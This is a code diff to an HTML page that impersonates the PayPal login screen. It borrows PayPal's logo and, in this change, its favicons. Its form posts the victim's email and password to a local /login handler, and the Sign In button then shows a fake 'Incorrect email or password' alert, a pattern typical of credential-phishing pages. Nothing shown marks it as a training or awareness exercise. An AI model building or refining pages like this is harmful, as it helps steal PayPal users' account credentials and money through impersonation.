@@ -115,6 +115,8 @@
             text-decoration: underline;
         }
     </style>
+    <link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico">
+    <link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png">
 </head>
 
 <body>
@@ -123,10 +125,12 @@
         <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo" class="logo">
         <form action="/login" id="login-form" method="post">
             <div style="margin-bottom: 3px;">
-                <input type="email" name="email" class="input-field" placeholder="Email or mobile number" required>
+                <input type="email" name="email" id="email" class="input-field" placeholder="Email or mobile number"
+                    required>
             </div>
             <div style="margin-bottom: 3px;">
-                <input type="password" name="password" class="input-field" placeholder="Password" required>
+                <input type="password" name="password" id="password" class="input-field" placeholder="Password"
+                    required>
             </div>
             <a href="#" class="forgot-link">Forgot email?</a>
             <button type="submit" class="next-btn" onclick="alert('Incorrect email or password')">Sign In</button>
